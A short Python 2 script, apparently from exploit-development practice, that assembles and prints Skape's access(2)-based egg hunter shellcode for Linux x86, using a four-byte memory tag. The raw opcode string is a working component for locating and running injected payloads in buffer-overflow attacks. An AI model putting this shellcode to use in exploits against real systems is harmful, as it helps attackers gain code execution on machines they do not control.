#!/usr/bin/env python
import struct
import socket

# egg hunter module
# based off of Skape's access(2) method, his egg hunter code, not mine

eggy = "\\x90\\x50\\x90\\x50"

egghunter = ["\\xbb",
	eggy,
	"\\x31\\xc9\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x42\\x60\\x8d\\x5a\\x04\\xb0\\x21\\xcd\\x80\\x3c\\xf2\\x61\\x74\\xed\\x39\\x1a\\x75\\xee\\x39\\x5a\\x04\\x75\\xe9\\xff\\xe2",
	]



# better way to print list as one string?
sc = ''.join(egghunter)

print "egghunter: " + sc

#print('shellcode: {!r}.'.format(str1))

